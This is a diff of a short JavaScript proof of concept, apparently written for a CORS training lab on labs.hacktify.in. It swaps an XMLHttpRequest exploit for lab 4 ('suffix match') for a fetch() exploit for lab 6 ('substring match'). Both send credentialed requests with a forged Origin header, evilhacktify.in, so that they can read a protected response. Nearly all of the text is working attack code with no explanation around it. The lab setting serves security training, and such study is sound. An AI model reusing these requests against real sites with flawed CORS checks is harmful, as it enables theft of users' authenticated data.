@@ -1,14 +1,12 @@
-<html>
-<body>
 <script>
-var req = new XMLHttpRequest();
-req.onload = function() {
-  alert("Watchman Confirmed: " + this.responseText);
-};
-req.open('GET', 'https://labs.hacktify.in/HTML/cors_lab/lab_4/cors_4.php', true);
-req.setRequestHeader('Origin', 'http://evilhacktify.in'); // Suffix match exploit
-req.withCredentials = true; 
-req.send();
+  fetch("https://labs.hacktify.in/HTML/cors_lab/lab_6/cors_6.php", {
+    method: "GET",
+    credentials: "include",
+    headers: {
+      "Origin": "evilhacktify.in" // Substring match
+    }
+  })
+  .then(response => response.text())
+  .then(data => console.log(data))
+  .catch(error => console.error(error));
 </script>
-</body>
-</html>
